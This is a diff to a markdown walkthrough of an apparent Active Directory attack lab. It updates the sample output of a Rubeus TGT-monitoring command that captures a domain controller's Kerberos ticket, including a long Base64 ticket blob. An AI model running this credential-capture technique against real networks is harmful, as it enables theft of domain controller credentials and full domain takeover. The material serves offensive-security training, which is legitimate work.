@@ -39,13 +39,30 @@ C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
 ```
 ✅ If successful, **Rubeus** will display the captured **TGT** for the **Domain Controller (CDC01$)**:
 ```
-[*] 4/13/2020 2:45:16 PM UTC - Found new TGT:
-User : CDC01$@PROD.CORP1.COM
-StartTime : 4/13/2020 2:26:32 AM
-EndTime : 4/13/2020 12:26:32 PM
-RenewTill : 4/15/2020 8:14:07 AM
-Flags forwardable
-Base64EncodedTicket : doIFIjCCBR6gAwIBBaEDAgEWo...
+  ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: TGT Monitoring
+[*] Target user     : DC03$
+[*] Monitoring every 1 seconds for new TGTs
+
+
+[*] 3/12/2025 7:12:29 PM UTC - Found new TGT:
+
+  User                  :  DC03$@INFINITY.COM
+  StartTime             :  3/12/2025 10:04:21 AM
+  EndTime               :  3/12/2025 8:04:12 PM
+  RenewTill             :  3/19/2025 10:04:12 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFDDCCBQigAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoQ4bDElORklOSVRZLkNPTaIhMB+gAwIBAqEYMBYbBmtyYnRndBsMSU5GSU5JVFkuQ09No4IDzDCCA8igAwIBEqEDAgECooIDugSCA7b3sg2GBmbr4u/a40rIvBX87ha3p0bhHayhLTEG5JqQG8W2tmxrjFUYiz5Zsex4PnB+FNs3/6Dyu+ngk9tugsNSlwObbrv53G/+zW7wFCYYHZ80A7AF5dD1rCv6L4m2SJtQxol9CCojbx/uWAJtXNw6A6wFzfrHSrL+aV5zqE0w3S8cXNTQjx3QebMuspH6PpVAf+adpFhTBQx67HB8RWFqdCdkd/iL1m3HAcZwmhhdmq90CJm7OMOOoiZozYNGApJKtolcnSO3dPfvwKQ0Rh+DdpiTAXtm9iQWPmcEoLKxfoN/nFPnCF/egVLl7E9SYKhrEX8rOEsvP9o+1Go6Zl7HPBSZJOEkTxnIsvSMw2mMn8hJEVBKcPrRUkY6UjOw8X+8YMMWHoZ4vr9C8OVVxwOGgW5rJ6qDBslSDmBvsLlsh57gLCrJKSEzEfTOsnJdjsahXqUPBmKhdBR+9cpY1IdJFUI5008GpUoi0WccwTn
 ```
 
 ---
